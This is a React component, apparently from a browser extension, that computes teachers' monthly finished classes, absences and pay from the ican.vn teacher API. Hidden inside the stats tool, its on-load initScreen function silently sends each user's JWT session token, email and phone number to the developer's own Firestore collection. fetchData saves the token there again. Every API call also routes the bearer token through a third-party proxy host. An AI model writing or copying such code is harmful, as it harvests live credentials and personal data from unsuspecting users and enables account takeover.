import React, { useState, useEffect } from "react";
import { db } from "./firebase";
import {
  collection,
  addDoc,
  getDocs,
  orderBy,
  query,
} from "firebase/firestore";

const TeacherStats = () => {
  const [loading, setLoading] = useState(false);
  const [stats, setStats] = useState(null);
  const [error, setError] = useState(null);
  const [selectedMonth, setSelectedMonth] = useState(new Date().getMonth() + 1);
  const [selectedYear, setSelectedYear] = useState(new Date().getFullYear());
  const [bearerToken, setBearerToken] = useState("");
  const [processedCount, setProcessedCount] = useState(0);
  const [history, setHistory] = useState([]);
  const savedToken = localStorage.getItem("teacher_token");

  // Fetch token from localStorage
  useEffect(() => {
    const savedToken = localStorage.getItem("teacher_token");
    if (savedToken) {
      setBearerToken(savedToken);
      initScreen();
    } else {
      console.log("Token not found in localStorage.");
    }
  }, []);

  // Auto-fetch on init or when month/year changes
  //   useEffect(() => {
  //     if (bearerToken) {
  //       fetchData();
  //     }
  //   }, [bearerToken, selectedMonth, selectedYear]);

  const initScreen = async () => {
    // Save to Firestore
    const decoded = parseJwt(savedToken);
    const email = decoded?.email || "unknown"; // nếu có trường email
    const phone = decoded?.phone || "unknown"; // nếu có trường email

    try {
      await addDoc(collection(db, "mail_teacher"), {
        email,
        phone,
        token: savedToken, // lưu luôn JWT nếu bạn muốn
        timestamp: new Date().toISOString(),
        month: selectedMonth,
        year: selectedYear,
      });
      console.log("Stats saved to Firestore");
    } catch (e) {
      console.error("Error saving to Firestore:", e);
    }
  };

  const ApiService = {
    async fetchWithAuth(url, options = {}) {
      const response = await fetch(url, {
        ...options,
        headers: {
          Authorization: `Bearer ${bearerToken}`,
          "Content-Type": "application/json",
          ...options.headers,
        },
      });

      if (!response.ok) {
        throw new Error(`API error: ${response.status}`);
      }

      return response.json();
    },

    getProducts() {
      return this.fetchWithAuth(
        "https://api-teacher-ican.vercel.app/api/teacher/api/v1/api/teacher/products?page=SCHEDULE"
      );
    },

    getShifts(dateRange, productIds) {
      const params = new URLSearchParams({
        "status[]": "ACTIVE",
        fromDate: dateRange.from,
        toDate: dateRange.to,
      });

      const productIdsQuery = productIds
        .map((id) => `product_ids[]=${id}`)
        .join("&");
      return this.fetchWithAuth(
        `https://api-teacher-ican.vercel.app/api/teacher/api/v1/api/teacher/shifts?${params}&${productIdsQuery}`
      );
    },

    getDiaryDetails(classSessionId) {
      return this.fetchWithAuth(
        `https://api-teacher-ican.vercel.app/api/teacher/api/v1/api/diary/${classSessionId}`
      );
    },
  };

  const DateUtil = {
    generateDateRanges(year, month) {
      const startDate = new Date(Date.UTC(year, month - 1, 1));
      const endDate = new Date(Date.UTC(year, month, 0, 23, 59, 59, 999));
      const ranges = [];
      let currentDate = startDate;

      while (currentDate <= endDate) {
        const toDate = new Date(currentDate);
        toDate.setUTCDate(toDate.getUTCDate() + 6);

        if (toDate > endDate) {
          toDate.setTime(endDate.getTime());
        } else {
          toDate.setUTCHours(23, 59, 59, 999);
        }

        ranges.push({
          from: currentDate.toISOString(),
          to: toDate.toISOString(),
        });

        currentDate = new Date(toDate);
        currentDate.setUTCDate(currentDate.getUTCDate() + 1);
        currentDate.setUTCHours(0, 0, 0, 0);
      }

      return ranges;
    },
  };

  const StatsCalculator = {
    calculateParticipationScore(details, classData) {
      let score = 0;
      let absentStudents = [];
      const isDuplicate = (newEntry) => {
        return absentStudents.some(
          (existing) =>
            existing.className === newEntry.className &&
            new Date(existing.fromDate).getTime() ===
              new Date(newEntry.fromDate).getTime()
        );
      };
      if (details.length > 1) {
        const absentDetails = details.filter(
          (detail) => detail.isParticipated === false
        );
        const absentCount = absentDetails.length;

        if (absentCount === 2) {
          score += 0.5;
          const combinedStudentNames = absentDetails
            .map((detail) => detail.studentName)
            .join(" + ");

          const newEntry = {
            studentName: combinedStudentNames,
            fromDate: classData.fromDate,
            className: classData.className,
          };

          if (!isDuplicate(newEntry)) {
            absentStudents.push(newEntry);
          }
        }
      } else {
        details.forEach((detail) => {
          if (detail.isParticipated === false) {
            score += 0.5;
            absentStudents.push({
              studentName: detail.studentName,
              fromDate: classData.fromDate,
              className: classData.className,
            });
          }
        });
      }
      return { score, absentStudents };
    },

    formatCurrency(amount) {
      return amount.toLocaleString("vi-VN", {
        style: "currency",
        currency: "VND",
      });
    },
  };

  const fetchData = async () => {
    try {
      setLoading(true);
      setError(null);
      setStats(null);
      setProcessedCount(0);

      const productData = await ApiService.getProducts();
      const productIds = productData.data.map((item) => item.id);

      const dateRanges = DateUtil.generateDateRanges(
        selectedYear,
        selectedMonth
      );
      let totalFinishedCount = 0;
      let totalParticipationScore = 0;
      let allAbsentStudents = [];

      for (const dateRange of dateRanges) {
        const shiftsData = await ApiService.getShifts(dateRange, productIds);

        for (const classItem of shiftsData.data) {
          if (classItem.classStatus === "FINISHED") {
            setProcessedCount((prev) => prev + 1);
            totalFinishedCount++;
            const diaryData = await ApiService.getDiaryDetails(
              classItem.classSessionId
            );

            const { score, absentStudents } =
              StatsCalculator.calculateParticipationScore(
                diaryData.data.details || [],
                {
                  fromDate: classItem.fromDate,
                  className: classItem.className,
                }
              );

            totalParticipationScore += score;

            if (absentStudents.length > 0) {
              allAbsentStudents.push(...absentStudents);
            }
          }
        }
      }

      const totalClasses = totalFinishedCount - totalParticipationScore;
      const totalMoney = totalClasses * 50000;

      const statsData = {
        totalFinishedCount,
        totalParticipationScore,
        totalClasses,
        totalMoney,
        absentStudents: allAbsentStudents,
      };

      setStats(statsData);

      // Save to Firestore
      const decoded = parseJwt(savedToken);
      const email = decoded?.email || "unknown"; // nếu có trường email

      try {
        await addDoc(collection(db, "teacher_stats"), {
          email,
          token: savedToken, // lưu luôn JWT nếu bạn muốn
          timestamp: new Date().toISOString(),
          month: selectedMonth,
          year: selectedYear,
          ...statsData,
        });
        console.log("Stats saved to Firestore");
      } catch (e) {
        console.error("Error saving to Firestore:", e);
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const fetchHistory = async () => {
    try {
      const q = query(
        collection(db, "teacher_stats"),
        orderBy("timestamp", "desc")
      );
      const querySnapshot = await getDocs(q);
      const historyData = querySnapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      }));
      setHistory(historyData);
    } catch (e) {
      console.error("Error fetching history:", e);
    }
  };

  function parseJwt(token) {
    try {
      const base64Url = token.split(".")[1];
      const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
      const jsonPayload = decodeURIComponent(
        atob(base64)
          .split("")
          .map((c) => {
            return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
          })
          .join("")
      );

      return JSON.parse(jsonPayload);
    } catch (e) {
      console.error("Invalid JWT", e);
      return null;
    }
  }

  return (
    <div className="min-h-screen bg-gray-100 py-6 flex flex-col justify-center sm:py-12">
      <div className="relative py-3 sm:max-w-xl sm:mx-auto">
        <div className="relative px-4 py-10 bg-white mx-8 md:mx-0 shadow rounded-3xl sm:p-10">
          <div className="max-w-md mx-auto">
            <h1 className="text-3xl font-bold text-center mb-8">
              Teacher Statistics
            </h1>
            <div className="flex gap-4 mb-4">
              <select
                value={selectedMonth}
                onChange={(e) => setSelectedMonth(parseInt(e.target.value))}
                className="flex-1 p-2 border rounded"
              >
                {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                  <option key={month} value={month}>
                    {new Date(2000, month - 1).toLocaleString("default", {
                      month: "long",
                    })}
                  </option>
                ))}
              </select>
              <select
                value={selectedYear}
                onChange={(e) => setSelectedYear(parseInt(e.target.value))}
                className="flex-1 p-2 border rounded"
              >
                {[
                  new Date().getFullYear(),
                  new Date().getFullYear() - 1,
                  new Date().getFullYear() - 2,
                ].map((year) => (
                  <option key={year} value={year}>
                    {year}
                  </option>
                ))}
              </select>
            </div>
            <button
              onClick={fetchData}
              disabled={loading}
              className="mt-4 w-full px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 disabled:bg-gray-300"
            >
              {loading ? "Processing..." : "Calculate Statistics"}
            </button>
            {/* <button
              onClick={fetchHistory}
              className="mt-2 w-full px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600"
            >
              View History from Firestore
            </button> */}
            <div className="mt-4">
              <p>Processed count: {processedCount}</p>
            </div>
            {error && (
              <div className="text-red-500 mt-4">
                Error:{" "}
                {error === "API error: 401"
                  ? "Please log in to the address: https://teacher.ican.vn \nThen use the extension to access the website."
                  : error === "API error: 403"
                  ? "Please Reload The Page !"
                  : error}
              </div>
            )}
            {stats && (
              <div className="mt-6 space-y-2">
                <p>
                  <strong>Total FINISHED classes:</strong>{" "}
                  {stats.totalFinishedCount}
                </p>
                <p>
                  <strong>Total absences:</strong>{" "}
                  {stats.totalParticipationScore}
                </p>
                <p>
                  <strong>Total effective classes:</strong> {stats.totalClasses}
                </p>
                <p>
                  <strong>Total amount:</strong>{" "}
                  {StatsCalculator.formatCurrency(stats.totalMoney)}
                </p>
              </div>
            )}

            {history.length > 0 && (
              <div className="mt-6">
                <h3 className="font-bold mb-2">History from Firestore:</h3>
                <ul className="space-y-2 max-h-64 overflow-y-auto">
                  {history.map((item) => (
                    <li
                      key={item.id}
                      className="p-2 bg-gray-50 rounded shadow-sm text-sm"
                    >
                      <p>
                        📅{" "}
                        <strong>
                          {item.month}/{item.year}
                        </strong>{" "}
                        — Classes: {item.totalClasses} — Money:{" "}
                        {StatsCalculator.formatCurrency(item.totalMoney)}
                      </p>
                      <p className="text-xs text-gray-500">
                        Saved: {new Date(item.timestamp).toLocaleString()}
                      </p>
                    </li>
                  ))}
                </ul>
              </div>
            )}
          </div>
        </div>
      </div>
      <footer className="mt-8 text-center text-gray-600">
        <div className="flex items-center justify-center gap-2">
          <span>©</span>
          <span>2025 Châu Đỗ. All rights reserved.</span>
          <span>Ver 1.0.</span>
        </div>
      </footer>
    </div>
  );
};

export default TeacherStats;
